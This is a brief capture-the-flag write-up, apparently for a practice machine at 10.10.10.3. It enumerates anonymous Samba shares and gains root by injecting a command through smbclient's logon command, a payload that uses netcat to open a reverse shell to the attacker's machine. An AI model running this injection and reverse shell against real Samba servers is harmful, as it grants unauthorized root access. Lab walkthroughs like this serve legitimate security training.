# Solution


Scan the host

We see that we can login to frp anonymously. However there is nothing inside and we don't have write access.

We also have anonymous access on samba, this time with write permissions.
Enumerate the shares
```
> smbclient -L 10.10.10.3
```

Connect to the resource
```
>smbclient //10.10.10.3/tmp
```

Once inside we can set up a reverse shell using the logon command and the listener in our host mahcine (nc -lnvp 10.10.14.6)
```
logon "/=nc 10.10.14.6 9001 -e /bin/bash`"
```

The reverse shell directly gives us access to root.
The user flag is under /home/makis
